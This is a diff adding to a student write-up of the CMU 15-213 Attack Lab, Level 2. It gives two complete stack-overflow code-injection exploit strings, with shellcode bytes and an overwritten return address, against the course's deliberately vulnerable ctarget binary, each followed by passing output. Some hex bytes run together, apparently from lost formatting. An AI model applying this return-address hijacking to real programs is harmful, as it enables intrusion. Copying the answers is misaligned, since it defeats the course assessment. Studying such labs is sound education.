@@ -186,7 +186,38 @@ injection_code.o:     file format elf64-x86-64Disassembly of section .text:0
 
 Next, our goal is how to arrange the layout of the input exploit string to mislead the program to do the behavior that we expect.
 
+**There have two ways to do arrange the layout of exploit string without using jmp or call instructions.**
 
+**First** way is that we first overwrite the return area to make the program jump to the address that store the beginning of the input exploit string:`0x5561dc78`, where it is the top of the stack frame after called `getbuf()`. Then, we put the Hexadecimal Code generate by objdump into the head of exploit input string, where it mislead the program take this code as the instructions to pass the cookie value to `touch2` and jump to `touch2`.
+
+Here is final exploit string:
+
+```
+48 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00
+```
+
+We pass the test:
+
+```bash
+~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+```
+
+The **second way** is to **not only overwrite the next 8 bytes address, but next 24 bytes address**, where the return area should point to the next line of assembly code `0x5561dca8`. The `Hexadecimal code` we made should be after the return address:
+
+The exploit string should be like this:
+
+```
+00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00a8 dc 61 55 00 00 00 0048 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 00
+```
+
+Also pass the test:
+
+```bash
+~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+			 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A8 DC 61 55 
+	 		 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 
+```
 
 ### 1.3 Level 3
 
